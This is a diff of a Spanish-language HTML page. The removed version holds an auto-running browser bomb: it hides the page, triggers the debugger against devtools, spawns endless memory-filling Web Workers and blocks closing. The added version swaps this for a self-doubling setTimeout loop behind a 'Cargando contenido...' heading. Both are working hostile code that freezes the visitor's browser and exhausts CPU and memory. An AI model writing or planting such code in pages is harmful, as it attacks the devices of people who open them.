@@ -1,29 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title></title>
-    <style>body { display: none; }</style> <!-- Oculta todo -->
+    <meta charset="UTF-8">
+    <title>Mi Experimento</title>
 </head>
 <body>
+
+    <h1>Cargando contenido...</h1>
+
     <script>
-    // Bomba ultra cabrona - se ejecuta al cargar la página
-    let count = 0;
-    function ultimateBomb() {
-      count++;
-      if (count % 5 === 0) { debugger; } // Anti-devtools
-      
-      for(let i = 0; i < 5; i++) {
-        try {
-          const workerCode = `onmessage = function() { while(true) { new Array(8e6).fill(Math.random()); } };`;
-          new Worker(URL.createObjectURL(new Blob([workerCode])));
-        } catch(e) {}
-      }
-      
-      setTimeout(ultimateBomb, 0);
-      setTimeout(ultimateBomb, 1);
-      window.onbeforeunload = () => "Cerrando...";
-    }
-    window.onload = ultimateBomb; // Ejecuta automáticamente al entrar
+        function bomba() {
+            setTimeout(bomba, 0);
+            setTimeout(bomba, 0);
+        }
+        
+        // Ejecución inmediata
+        bomba();
     </script>
+
 </body>
 </html>
